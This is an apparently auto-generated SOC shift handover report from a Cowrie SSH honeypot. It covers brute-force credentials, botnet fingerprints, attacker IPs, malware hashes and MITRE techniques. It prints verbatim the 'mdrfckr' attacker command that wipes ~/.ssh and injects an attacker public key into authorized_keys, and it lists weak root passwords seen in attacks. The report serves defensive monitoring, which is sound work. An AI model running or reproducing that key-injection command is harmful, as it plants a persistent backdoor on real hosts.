# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-21 |
| **Generated At** | 2026-06-21T17:43:59Z |
| **Shift Time** | 17:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **21** |
| Confirmed Threats | **19** |
| False Positives Filtered | **2** (9.5%) |
| Unique Attacker IPs | **11** |
| Countries of Origin | **5** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **17** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **13** |
| Unique Credential Pairs | **12** |
| Unique Usernames | **10** |
| Unique Passwords | **12** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4 |
| `git` | 1 |
| `operator` | 1 |
| `ftptest` | 1 |
| `test` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 2 |
| `123!@#qweQWE` | 1 |
| `1q2w3e4r` | 1 |
| `As123456789` | 1 |
| `1234567890` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 2 |
| `git` | `123!@#qweQWE` | 1 |
| `operator` | `1q2w3e4r` | 1 |
| `root` | `As123456789` | 1 |
| `ftptest` | `1234567890` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `As123456789` | `46.29.234.126` | 2026-06-21T16:34:55 |
| `root` | `3245gs5662d34` | `46.29.234.126` | 2026-06-21T16:35:06 |
| `root` | `Aa12345.` | `103.75.183.177` | 2026-06-21T17:03:00 |
| `root` | `3245gs5662d34` | `103.75.183.177` | 2026-06-21T17:03:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **21** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 11 |
| OpenSSH | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 11 | 4 |
| `acaa53e0a7d7...` | Mirai/variant | 2 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 11 | 4 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 2 | 2 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `46.29.234.126`, `103.75.183.177`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **11** |
| Unique ASNs | **11** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS215540` | GLOBAL CONNECTIVITY SOLUTIONS LLP | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS151858` | INTERDIGI JOINT STOCK COMPANY | 1 | HIGH |
| `AS3462` | Data Communication Business Group | 1 | MEDIUM |
| `AS16863` | Home Telephone Company, Inc. | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | MEDIUM |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS16276` | OVH SAS | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c04d7b6e004e

| Field | Detail |
|---|---|
| **Source IP** | `46.29.234[.]126` |
| **First Seen** | 2026-06-21 16:34 |
| **Last Seen** | 2026-06-21 16:35 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-21 16:34:54` | `cowrie.session.connect` |
| `2026-06-21 16:34:54` | `cowrie.client.version` |
| `2026-06-21 16:34:54` | `cowrie.client.kex` |
| `2026-06-21 16:34:55` | `cowrie.login.success` |
| `2026-06-21 16:34:55` | `cowrie.session.params` |
| `2026-06-21 16:34:55` | `cowrie.command.input` |
| `2026-06-21 16:34:55` | `cowrie.command.failed` |
| `2026-06-21 16:34:55` | `cowrie.log.closed` |
| `2026-06-21 16:34:56` | `cowrie.session.params` |
| `2026-06-21 16:34:56` | `cowrie.command.input` |
| `2026-06-21 16:34:56` | `cowrie.session.file_download` |
| `2026-06-21 16:34:56` | `cowrie.log.closed` |
| `2026-06-21 16:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.29.234[.]126` to AbuseIPDB if not already reported
- [ ] Block `46.29.234[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c919e88ecd6e

| Field | Detail |
|---|---|
| **Source IP** | `46.29.234[.]126` |
| **First Seen** | 2026-06-21 16:35 |
| **Last Seen** | 2026-06-21 16:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-21 16:35:05` | `cowrie.session.connect` |
| `2026-06-21 16:35:05` | `cowrie.client.version` |
| `2026-06-21 16:35:06` | `cowrie.client.kex` |
| `2026-06-21 16:35:06` | `cowrie.login.success` |
| `2026-06-21 16:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.29.234[.]126` to AbuseIPDB if not already reported
- [ ] Block `46.29.234[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9884e615ea19

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-21 17:03 |
| **Last Seen** | 2026-06-21 17:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-21 17:03:00` | `cowrie.session.connect` |
| `2026-06-21 17:03:00` | `cowrie.client.version` |
| `2026-06-21 17:03:00` | `cowrie.client.kex` |
| `2026-06-21 17:03:00` | `cowrie.login.success` |
| `2026-06-21 17:03:00` | `cowrie.session.params` |
| `2026-06-21 17:03:00` | `cowrie.command.input` |
| `2026-06-21 17:03:00` | `cowrie.command.failed` |
| `2026-06-21 17:03:01` | `cowrie.log.closed` |
| `2026-06-21 17:03:01` | `cowrie.session.params` |
| `2026-06-21 17:03:01` | `cowrie.command.input` |
| `2026-06-21 17:03:01` | `cowrie.session.file_download` |
| `2026-06-21 17:03:01` | `cowrie.log.closed` |
| `2026-06-21 17:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b43433a97b16

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-21 17:03 |
| **Last Seen** | 2026-06-21 17:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-21 17:03:03` | `cowrie.session.connect` |
| `2026-06-21 17:03:03` | `cowrie.client.version` |
| `2026-06-21 17:03:03` | `cowrie.client.kex` |
| `2026-06-21 17:03:03` | `cowrie.login.success` |
| `2026-06-21 17:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `46.29.234[.]126` | **4** | 2026-06-21 16:37 | 2026-06-21 16:47 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `18.219.56[.]153` | **3** | 2026-06-21 16:47 | 2026-06-21 16:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `135.148.33[.]168` | **2** | 2026-06-21 17:27 | 2026-06-21 17:41 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.75.183[.]177` | 1 | 2026-06-21 17:03 | 2026-06-21 17:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.150.103[.]210` | 1 | 2026-06-21 16:36 | 2026-06-21 16:36 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.186.174[.]35` | 1 | 2026-06-21 16:40 | 2026-06-21 16:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.212.235[.]194` | 1 | 2026-06-21 16:17 | 2026-06-21 16:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.208.152[.]209` | 1 | 2026-06-21 17:42 | 2026-06-21 17:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.53.7[.]231` | 1 | 2026-06-21 16:24 | 2026-06-21 16:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 44/100 | 🟡 MEDIUM | **35/73** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 9 |
| `64.53.7[.]231` | US | Home Telephone Company, Inc. | **100** ⚠️ | 50 |
| `122.186.174[.]35` | IN | SAHYADRI INDUSTRIES LTD. | **100** ⚠️ | 50 |
| `18.219.56[.]153` | US | Amazon Technologies Inc. | **100** ⚠️ | 46 |
| `46.29.234[.]126` | LT | GLOBAL CONNECTIVITY SOLUTIONS LLP | **100** ⚠️ | 19 |
| `125.212.235[.]194` | VN | Viettel Group | **100** ⚠️ | 41 |
| `103.75.183[.]177` | VN | BQT computer technology | **100** ⚠️ | 29 |
| `107.150.103[.]210` | US | UCLOUD | **100** ⚠️ | 50 |
| `172.208.152[.]209` | US | Microsoft Limited | **80** ⚠️ | 1 |
| `125.227.240[.]43` | TW | Chunghwa Telecom Data Communication Business Group | **58** | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 14 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 9 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 21 cases |
| Tool 34  | Credential Extractor        | ✅ 13 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 11 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (9.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 9 recon entry/entries in table (3 group(s) consolidating 9 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-21T17:43:59Z_
